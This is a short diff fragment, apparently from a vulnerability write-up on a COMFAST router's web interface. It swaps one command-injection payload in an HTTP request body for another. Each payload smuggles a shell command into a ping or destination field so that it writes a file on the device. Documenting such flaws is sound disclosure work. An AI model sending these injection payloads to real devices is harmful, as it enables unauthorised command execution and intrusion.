@@ -84,7 +84,7 @@ Cookie: COMFAST\_SESSIONID=c0a800a0-ffffffc40f08ffffffaaffffff82fffffff0-6b8b456
 
 Connection: close
 
-{"ping\_target":"8.8.8.8 && ls /etc > /www-comfast/ping\_test.txt","count":4,"timeout":2}
+{"destination": "127.0.0.1\"; echo  ping config >  /www-comfast/test.txt #"}
 ```
 
 
